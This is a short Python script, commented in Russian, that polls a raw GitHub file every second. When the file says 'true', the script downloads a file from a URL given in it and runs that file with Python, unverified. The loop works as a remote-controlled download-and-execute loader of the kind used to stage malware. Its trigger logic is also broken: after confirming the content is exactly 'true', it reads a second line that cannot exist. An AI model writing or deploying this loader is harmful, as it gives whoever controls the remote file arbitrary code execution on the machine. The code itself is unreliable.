import time
import requests
import subprocess

def check_and_execute_script():
    while True:
        try:
            response = requests.get('https://raw.githubusercontent.com/username/repository/master/file.txt')
            response.raise_for_status()  # Проверяем, были ли ошибки при запросе
            content = response.text.strip()

            if content.lower() == 'true':
                file_url = content.split('\n')[1]
                download_and_execute_script(file_url)

        except requests.exceptions.RequestException as e:
            print(f"Ошибка при запросе: {e}")

        time.sleep(1)

def download_and_execute_script(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        # Извлекаем имя файла из URL
        file_name = url.split("/")[-1]

        with open(file_name, 'wb') as file:
            file.write(response.content)

        print(f"Файл успешно загружен: {url}")

        # Выполняем скрипт
        subprocess.run(['python', file_name])

    except requests.exceptions.RequestException as e:
        print(f"Ошибка при скачивании и выполнении файла: {e}")

if __name__ == "__main__":
    check_and_execute_script()
